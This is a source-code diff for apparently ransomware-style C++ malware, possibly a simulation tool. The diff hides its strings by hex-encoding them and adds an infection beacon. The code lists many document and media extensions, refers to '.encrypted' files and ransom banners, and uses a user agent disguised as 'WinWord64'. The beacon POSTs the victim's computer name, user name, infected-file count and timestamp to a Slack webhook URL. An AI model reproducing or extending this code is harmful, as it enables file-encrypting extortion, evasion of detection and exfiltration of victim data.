@@ -49,30 +49,31 @@ bool g_Decrypt = false;
 //
 // Use StringToHexGenerator.exe to generate the Hex version of a string you want to obfuscate
 //
+std::string strKey = "9764742653472355868674465764752686e46595a7e485169764742644e4851697862315"; // Q2hyaXNDbGFyaXNzYVNhbWFudGhhU2t5bGFy
 std::string strAppData = "16471644070714"; // AppData
 std::string strAllUsers = "372756375502c6c614"; // All Users
 std::string strPublicAcctPics = "375627574736960547e657f6363614c53696c6265705"; //  Public\\AccountPictures
 std::string strExtBmp  = "07d626e2";   // .bmp
 std::string strExtJpg  = "7607a6e2";   // .jpg
 std::string strExtJpeg = "765607a6e2"; // .jpeg
-std::string strExtPng  = "76e607e2";    // .png
-std::string strExtGif  = "669676e2";    // .gif
-std::string strExtMp4  = "4307d6e2";  // .mp4
-std::string strExtMpg  = "7607d6e2"; // .mpg
+std::string strExtPng  = "76e607e2";   // .png
+std::string strExtGif  = "669676e2";   // .gif
+std::string strExtMp4  = "4307d6e2";   // .mp4
+std::string strExtMpg  = "7607d6e2";   // .mpg
 std::string strExtMpeg = "765607d6e2"; // .mpeg
-std::string strExtMov  = "67f6d6e2"; // .mov
-std::string strExtMkv  = "67b6d6e2"; // .mkv
+std::string strExtMov  = "67f6d6e2";   // .mov
+std::string strExtMkv  = "67b6d6e2";   // .mkv
 std::string strExtM2ts = "374723d6e2"; // .m2ts
-std::string strExtMp3  = "3307d6e2"; // .mp3
-std::string strExtM4a  = "1643d6e2"; // .m4a
-std::string strExtDoc  = "36f646e2"; // .doc
+std::string strExtMp3  = "3307d6e2";   // .mp3
+std::string strExtM4a  = "1643d6e2";   // .m4a
+std::string strExtDoc  = "36f646e2";   // .doc
 std::string strExtDocx = "8736f646e2"; // .docx
-std::string strExtXls  = "37c687e2"; // .xls
+std::string strExtXls  = "37c687e2";   // .xls
 std::string strExtXlsx = "8737c687e2"; // .xlsx
-std::string strExtPpt  = "470707e2"; // .ppt
+std::string strExtPpt  = "470707e2";   // .ppt
 std::string strExtPptx = "87470707e2"; // .pptx
-std::string strExtPdf  = "664607e2"; // .pdf
-std::string strExtTxt  = "478747e2"; // .txt
+std::string strExtPdf  = "664607e2";   // .pdf
+std::string strExtTxt  = "478747e2";   // .txt
 std::string strExtEncrypted = "46564707972736e656e2"; // .encrypted
 std::string strBanner = "128796274716d40256864702f6470256d6f636c65675"; // "Welcome to the Matrix!"
 std::string strPasswordNeeded = "e25657e69647e6f63602f64702e6f6964707f60246f2025686470286479677024627f6773737160702160256469667f6270702473757d60257f695"; // "You must provide a password with the /d option to continue."
@@ -81,7 +82,19 @@ std::string strRecoveryFailed = "e24627f67737371607022757f697028647967702d616277
 std::string strAllYourFilesAreBelongToUs = "c5a302121212375502f6450276e6f6c6562402562714023756c69664022757f69502c6c614"; // "All Your Files Are Belong To Us!!! :\\"
 std::string strAllYourFilesAreBelongToYou = "e3a30212121257f69502f6450276e6f6c6562402562714023756c69664022757f69502c6c614"; // "All Your Files Are Belong To You!!! :>"
 std::string strNotAllYourFilesAreBelongToYou = "c3a30212121257f69502f6450276e6f6c6562402562714023756c69664022757f69502c6c6140247f6e4"; // "Not All Your Files Are Belong To You!!! :<"
-
+std::string strUserAgent = "03e213f243634627f675e69675"; // WinWord64/1.0
+std::string strSlackHost = "d6f636e2b63616c637e237b6f6f686"; // hooks.slack.com
+std::string strHttpPost = "4535f405"; // POST
+std::string strSlackUrl = "6705936676a754a45734657566f42793b483053794a5b615f27535e453e454d4a424f29573a505b453a4a445f23756369667275637f2"; // "/services/TJJ5KPZ7Y/BJMEN5NSW/QkZIsP8K9rOfWVCuJEzgf9Pv"
+std::string strHttpHeaderJson = "e6c527c5e6f637a6f2e6f69647163696c607071602a356079747d247e65647e6f634"; // "Content-type: application/json\r\n"
+//std::string strSlackPostMsg = ""; // "{ \"text\":\"New Infection!"  // not using at this time
+std::string strSlackNewInfection = "12e6f69647365666e694027756e422a322478756472202b7"; // "{ \"text\":\"New Infection!"
+std::string strSlackComputer = "02a32756475707d6f63402"; // " Computer: "
+std::string strSlackUser = "02a32756375502b3"; // "; User: "
+std::string strSlackFilesInfected = "02a3465647365666e694023756c6966402b3"; // "; Files Infected: "
+std::string strSlackTimestamp = "02a307d616473756d6964502b3"; // "; Timestamp: "
+std::string strSlackPostMsgEnd = "d70222"; // "\" }"
+std::string strCryptoProvider = "2756469667f627050236968607162776f64707972734023554140246e6160214352502465636e61686e654024766f637f6273696d4"; // "Microsoft Enhanced RSA and AES Cryptographic Provider"
 
 // Function Declarations
 DWORD FindFiles();
@@ -257,6 +270,8 @@ void DecodeStrings()
 {
 	// Decode the Encoded String Declarations into the actual text strings for use throughout the program
 
+	HexToString(strKey, strKey);
+
 	HexToString(strAppData, strAppData);
 	HexToString(strAllUsers, strAllUsers);
 	HexToString(strPublicAcctPics, strPublicAcctPics);
@@ -292,6 +307,18 @@ void DecodeStrings()
 	HexToString(strAllYourFilesAreBelongToUs, strAllYourFilesAreBelongToUs);
 	HexToString(strAllYourFilesAreBelongToYou, strAllYourFilesAreBelongToYou);
 	HexToString(strNotAllYourFilesAreBelongToYou, strNotAllYourFilesAreBelongToYou);
+
+	HexToString(strUserAgent, strUserAgent);
+	HexToString(strSlackHost, strSlackHost);
+	HexToString(strHttpPost, strHttpPost);
+	HexToString(strSlackUrl, strSlackUrl);
+	HexToString(strHttpHeaderJson, strHttpHeaderJson);
+	HexToString(strSlackNewInfection, strSlackNewInfection);
+	HexToString(strSlackComputer, strSlackComputer);
+	HexToString(strSlackUser, strSlackUser);
+	HexToString(strSlackFilesInfected, strSlackFilesInfected);
+	HexToString(strSlackTimestamp, strSlackTimestamp);
+	HexToString(strSlackPostMsgEnd, strSlackPostMsgEnd);
 }
 
 bool AnalysisCheck()
@@ -324,8 +351,11 @@ void SendInfectionBeacon(DWORD dwEncryptedFileCount)
 	HINTERNET hRequest = NULL;
 
 	// Use WinHttpOpen to obtain a HTTP session handle
+	std::wstring useragent_w = std::wstring(strUserAgent.begin(), strUserAgent.end());
+	LPCWSTR userAgent = useragent_w.c_str();
+
 	hSession = WinHttpOpen(
-		L"WinWord64/1.0",
+		userAgent, //L"WinWord64/1.0",
 		WINHTTP_ACCESS_TYPE_NO_PROXY,
 		WINHTTP_NO_PROXY_NAME,
 		WINHTTP_NO_PROXY_BYPASS, 
@@ -334,9 +364,12 @@ void SendInfectionBeacon(DWORD dwEncryptedFileCount)
 	// Connect to the beacon HTTP server
 	if (hSession)
 	{
+		std::wstring host_w = std::wstring(strSlackHost.begin(), strSlackHost.end());
+		LPCWSTR hostSlackApp = host_w.c_str();
+
 		hConnect = WinHttpConnect(
 			hSession,
-			L"hooks.slack.com",
+			hostSlackApp, //L"hooks.slack.com",
 			INTERNET_DEFAULT_HTTPS_PORT,
 			0);
 	}
@@ -347,10 +380,16 @@ void SendInfectionBeacon(DWORD dwEncryptedFileCount)
 	{
 		//std::cout << "Connected..." << std::endl;
 
+		std::wstring post_w = std::wstring(strHttpPost.begin(), strHttpPost.end());
+		LPCWSTR postMethod = post_w.c_str();
+
+		std::wstring url_w = std::wstring(strSlackUrl.begin(), strSlackUrl.end());
+		LPCWSTR urlSlackApp = url_w.c_str();
+
 		hRequest = WinHttpOpenRequest(
 			hConnect,
-			L"POST",
-			L"/services/TJJ5KPZ7Y/BJMEN5NSW/QkZIsP8K9rOfWVCuJEzgf9Pv",
+			postMethod, //L"POST",
+			urlSlackApp, //L"/services/TJJ5KPZ7Y/BJMEN5NSW/QkZIsP8K9rOfWVCuJEzgf9Pv",
 			NULL, WINHTTP_NO_REFERER,
 			WINHTTP_DEFAULT_ACCEPT_TYPES,
 			WINHTTP_FLAG_SECURE);
@@ -359,40 +398,47 @@ void SendInfectionBeacon(DWORD dwEncryptedFileCount)
 	//
 	// Prepare POST request headers and data
 	//
-	std::string jsonheader = "Content-type: application/json\r\n";
+	std::string jsonheader = strHttpHeaderJson; // "Content-type: application/json\r\n";
 	std::wstring jsonheader_w = std::wstring(jsonheader.begin(), jsonheader.end());
 	LPCWSTR headers = jsonheader_w.c_str();
 	DWORD headersLength = -1;
 
-	std::string post = "{ \"text\":\"New Infection!";
+	std::string postData = strSlackNewInfection; // "{ \"text\":\"New Infection!";
 	std::string computerName = GetLocalComputerName();
-	post.append(" Computer: ");
-	post.append(computerName);
+	postData.append(strSlackComputer); // (" Computer: ");
+	postData.append(computerName);
 	
 	std::string userName = GetCurrentUser();
-	post.append("; User: ");
-	post.append(userName);
+	postData.append(strSlackUser); // ("; User: ");
+	postData.append(userName);
 
-	post.append("; Files Infected: ");
-	post.append(std::to_string(dwEncryptedFileCount));
+	postData.append(strSlackFilesInfected); // ("; Files Infected: ");
+	postData.append(std::to_string(dwEncryptedFileCount));
 
 	std::string timestamp = GetUtcTime();
-	post.append("; Timestamp: ");
-	post.append(timestamp);
+	postData.append(strSlackTimestamp); // ("; Timestamp: ");
+	postData.append(timestamp);
 
-	post.append("\" }");
+	postData.append(strSlackPostMsgEnd); // ("\" }");
 
 
 	// Send the WinHttp POST request
 	if (hRequest)
 	{
+#ifdef TRACEOUTPUT
+		if (g_Verbosity)
+		{
+			std::cout << "Sending infection beacon message: " << postData << std::endl;
+		}
+#endif
+
 		fSuccess = WinHttpSendRequest(
 			hRequest,
 			headers,
 			headersLength,
-			(void*)post.c_str(),
-			static_cast<unsigned long>(post.length()),
-			static_cast<unsigned long>(post.length()),
+			(void*)postData.c_str(),
+			static_cast<unsigned long>(postData.length()),
+			static_cast<unsigned long>(postData.length()),
 			0);
 	}
 
@@ -414,9 +460,11 @@ void SendInfectionBeacon(DWORD dwEncryptedFileCount)
 			0, NULL);
 
 #ifdef TRACEOUTPUT
-
-		std::cout << "SendInfectionBeacon status: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
-		std::wcout << "SendInfectionBeacon error:  " << (LPTSTR)lpMsgBuf;
+		if (g_Verbosity)
+		{
+			std::cout << "SendInfectionBeacon status: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
+			std::wcout << "SendInfectionBeacon error:  " << (LPTSTR)lpMsgBuf;
+		}
 #endif
 	}
 
